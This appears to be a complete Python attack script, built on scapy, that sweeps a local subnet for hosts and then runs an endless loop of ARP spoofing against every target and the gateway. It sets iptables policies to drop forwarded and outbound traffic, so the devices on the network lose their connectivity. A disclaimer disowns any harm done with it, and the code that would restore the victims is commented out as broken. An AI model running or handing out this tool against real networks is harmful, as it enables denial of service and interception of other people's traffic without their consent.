#!/usr/bin/env python3

####################################
#           Disclaimer             #
# ________________________________ #
# I DO NOT TAKE ANY RESPONSIBILITY #
# FOR ANY HARM DONE WITH THIS TOOL #
# IT'S OPEN-SOURCE AND AVAILABLE   #
# TO EVERYONE, AS LONG AS YOU      #
# AREN'T BREAKING THE LICENSE I    #
# DON'T CARE.                      #
# ________________________________ #
#                   by crowfunder  #
####################################

from scapy.all import *
from time import sleep
import sys,os,argparse,subprocess,csv

######################################################################################

ERR = '\033[0;31m'
BAD_ERR = '\033[0;30m'
GREEN="\033[0;32m"
LOGO = '\033[1;35;47m'
NONE = '\033[0m'
ip_list = []
target_ip = ""
ap_ip = ""
target_mac = ""
ap_mac = ""
interface = ""
pings = 3
delay = 0.3

######################################################################################
# Argparse
parser = argparse.ArgumentParser(description=(GREEN + "Redirects local traffic of multiple devices through your machine also blocking it completely." + NONE))
parser.add_argument('-i', '--interface', type=str, required=True, help='''Pick an interface which'll be used.''')
parser.add_argument('-g', '--gateway', type=str, required=True, help='''Pick your gateway IP Address.''')
parser.add_argument('-t', '--time', type=float, default=0.3 ,required=False, help='''Optional selection of delays between target poisons. (Default - 0.3)''')
parser.add_argument('-p', '--pings', type=int, default=3, required=False, help='''Optional selection of number of pings sent to network targets when parsing ip list. (Default - 3)''')
parser.add_argument('-c', '--csv', type=str, required=False, help='''Optional selection of CSV file/file path containing ip's list in substitution for script-detected network targets. All addresses must be placed in the different lines.''') 
parser.add_argument('-s', '--silent', type=bool, required=False, choices=[True,False], help='''Optional selection of making the script return no status messages. (Default - False)''')
args = parser.parse_args()

#####################################################################################
# Ping the target and return command status.
def ping(ip):
    proc = subprocess.Popen(["ping","-c",str(pings),ip], stdout=subprocess.PIPE)
    stdout, stderr = proc.communicate()
    response = proc.returncode
    return response

# Convert ip to a mac address,
def get_mac_address(ip, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = ip), timeout = 2, iface = interface, inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# Basically just a network scanner
def ip_parser(ap_ip):
    ip_list = []
    rng = ap_ip
    while rng.endswith(".") == False:
        rng = rng[:-1]
    try:
        for ip in range(1,255):
            address = rng + str(ip)
            if ping(address) == 0:
                ip_list.append(address)
            else:
                pass
        return ip_list
    except KeyboardInterrupt:
        return ip_list
# (Deprecated) Leftovers of the ARP network scanner which i couldn't fix, replaced with a icmp scanner
'''
    arp = ARP(pdst=cidr)        
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    pckt = ether/arp
    result = srp(packet, timeout=3, verbose=False)[0]
    print(result)
    for sent,received in result:
        print({'ip': received.psrc, 'mac': received.hwsrc})
        ip_list.append(received.psrc)
    return ip_list
'''

# ip_parser() alternative for handling csv files.
def csv_parser(csvf):
    if '.csv' in csvf:
        with open(csvf) as file:
            reader = csv.reader(file)
            ip_list = list(reader)
            if ip_list:
                pass
            else:
                if silent == False:
                    print(BAD_ERR + "Empty file provided, halting!" + NONE)
    else:
        if silent == False:
            print(BAD_ERR + 'Wrong file provided, please use a file with ".csv" extension!' + NONE)
        sys.exit(0)
    return ip_list


# (Deprecated) ReARP leftovers, doesn't work and do anything so i removed it.
'''def reARP(target_ip, ap_ip):
    if silent == False:
        print(f"Restoring {target_ip}...")
    try:
        send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = target_mac), count = 7) 
        send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = ap_mac), count = 7)
        if silent == False:
            print(GREEN + "Restored Successfully!" + NONE)
    except:
        if silent == False:
            print(ERR + f"Unable to send ARP to {target_ip}" + NONE)'''
        

# Just a simple function handling program exiting
def exit_handler(interface, ap_ip):
    if silent == False:
        print("Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    if silent == False:
        print(GREEN + "Done!" + NONE)
        print("Unlocking entire outbound traffic...")
    os.system(f"iptables -P FORWARD ACCEPT")
    os.system(f"iptables -P OUTPUT ACCEPT")
    if silent == False:
        print(GREEN + "Done!" + NONE)
        print(ERR + "Exiting..." + NONE)
    sys.exit(1)
'''    if silent == False:
        print(GREEN + "Done!" + NONE)
        print("Restoring targets...")
    try:
        for target_ip in ip_list:
            reARP(target_ip, ap_ip)
            if silent == False:
                print(GREEN + f"Restored {target_ip}" + NONE)
    except KeyboardInterrupt:
        if silent == False:
            print(ERR + "User Interruption, halting..." + NONE)'''  # (Deprecated
            
#####################################################################################
# Main function wrapping eveything up.
def proxier(ap_ip, interface):
    try:
        ap_mac = get_mac_address(ap_ip, interface)
        if csvf:
            if silent == False:
                print(NONE + "Detected a CSV file, skipping IP parsing and importing...")
            ip_list = csv_parser(csvf)
        else:
            if silent == False:
                print(NONE + "Parsing available IP addresses, CTRL+C to stop if you wish...")
            ip_list = ip_parser(ap_ip)
        if silent == False:
            print(GREEN + "Done!" + NONE)
            print("Blocking entire outbound traffic...")
        os.system(f"iptables -P FORWARD DROP")
        os.system(f"iptables -P OUTPUT DROP")
        if silent == False:
            print(GREEN + "Done!" + NONE)
            print("Starting to Poison the Network...")
        while 1 < 2:
            for target_ip in ip_list:
                target_mac = get_mac_address(target_ip, interface)
                try:
                    send(ARP(op = 2, pdst = target_ip, psrc = ap_ip, hwdst= target_mac))
                    send(ARP(op = 2, pdst = ap_ip, psrc = target_ip, hwdst= ap_mac))
                    if silent == False:
                        print(GREEN + f"Poisoned {target_ip}" + NONE)
                except:
                    if silent == False:
                        print(ERR + f"Unable to send ARP to {target_ip}" + NONE)
                sleep(delay)
    except KeyboardInterrupt:
        if silent == False:
            print(ERR + "User Interrupt, exiting..." + NONE)
        exit_handler(interface,ap_ip)

def main():
    target_ip = ""
    ap_ip = ""
    target_mac = ""
    ap_mac = ""
    interface = ""
    global silent
    silent = False
    global csvf
    csvf = ''
    if args.interface:
        interface = args.interface
    if args.gateway:
        ap_ip = args.gateway
    if args.time:
        delay = args.time
    if args.pings:
        pings = args.pings
    if args.csv:
        csvf = args.csv
    if args.silent:
        silent = args.silent
    proxier(ap_ip, interface)

if __name__ == '__main__':
    main()
